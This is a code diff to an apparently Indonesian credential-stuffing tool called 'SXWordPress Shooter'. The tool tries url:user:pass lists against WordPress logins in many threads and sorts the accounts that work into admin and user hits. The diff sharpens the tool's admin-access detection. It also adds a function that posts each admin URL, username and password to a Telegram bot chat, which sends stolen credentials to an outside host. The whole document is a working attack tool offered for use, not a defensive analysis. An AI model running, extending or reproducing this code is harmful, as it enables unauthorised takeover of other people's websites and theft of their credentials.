@@ -81,7 +81,7 @@ def attempt_login(target_url, username, password, wp_path):
         return False, "not_vuln", None, False
 
     has_logged_cookie = "wordpress_logged_in" in "".join(session.cookies.keys())
-    login_body = (response.text or "").lower()
+    login_body = (response.text or "").lower().replace("’", "'")
     twofa_phrases = [
         "two-factor authentication", "2fa verification code",
         "two factor authentication", "authentication code:", "use a backup code",
@@ -94,13 +94,15 @@ def attempt_login(target_url, username, password, wp_path):
 
     try:
         admin_resp = session.get(f"{full_base}/wp-admin/", allow_redirects=True, timeout=15)
-        admin_body = (admin_resp.text or "").lower()
+        admin_body = (admin_resp.text or "").lower().replace("’", "'")
         forbidden_phrases = [
-            "you are not allowed to access this page",
+            "you are not allowed to access this",
             "you do not currently have privileges on this site",
             "you do not have sufficient permissions",
             "the current user doesn't have the",
             "has been a critical error",
+            "you don't have permission to access this page",
+            "you don't have permission to access this resource",
             "you don't have permission to access",
         ]
         forbidden = any(p in admin_body for p in forbidden_phrases)
@@ -124,6 +126,20 @@ def process_target(line, wp_path):
     return url, user, password, success, status, final_url, is_2fa
 
 
+def send_telegram_admin(token, chat_id, url, username, password, extra):
+    if not token or not chat_id:
+        return
+    text = f"[SXWP ADMIN]\n{url}\nUser: {username}\nPass: {password}{extra}"
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{token}/sendMessage",
+            data={"chat_id": chat_id, "text": text},
+            timeout=10,
+        )
+    except Exception:
+        return
+
+
 def main():
     parser = ShooterArgumentParser(
         description="SXWordPress Shooter V.10 - sxtools",
@@ -132,6 +148,8 @@ def main():
     parser.add_argument("-i", "--input",   required=True, help="path ke file payload (url:user:pass)")
     parser.add_argument("-t", "--threads", type=int, default=10, help="jumlah thread (default: 10)")
     parser.add_argument("-path", "--path", default="", help="sub-path WP, misal /blog")
+    parser.add_argument("-tt", "--telegram-token", default="", help="Telegram bot token (opsional)")
+    parser.add_argument("-ci", "--chat-id", default="", help="Telegram chat id (opsional)")
     args = parser.parse_args()
 
     os.system("cls" if os.name == "nt" else "clear")
@@ -154,6 +172,7 @@ def main():
 
     total = len(lines)
     vuln = not_vuln = blocked = admin_c = user_c = 0
+    use_telegram = bool(args.telegram_token and args.chat_id)
 
     # ── Banner & Info (dicetak sekali, tidak berubah) ─────────────────────────
     console.print(f"[green]{BANNER}[/green]")
@@ -219,20 +238,18 @@ def main():
                         blocked += 1
                     elif success:
                         vuln += 1
-                        if status == "admin":
-                            admin_c += 1
-                        else:
-                            user_c += 1
-
                         ts    = datetime.now().strftime("%H:%M:%S")
                         extra = " [2FA]" if is_2fa else ""
 
-                        # Cetak vuln log — muncul di atas live panel
                         if status == "admin":
+                            admin_c += 1
                             live.console.print(
                                 f"[red][ADMIN][/red] [{ts}] [bold]{url}[/bold] | {user}:{pwd}{extra}"
                             )
+                            if use_telegram:
+                                send_telegram_admin(args.telegram_token, args.chat_id, url, user, pwd, extra)
                         else:
+                            user_c += 1
                             live.console.print(
                                 f"[yellow][USER][/yellow]  [{ts}] {url} | {user}:{pwd}{extra}"
                             )
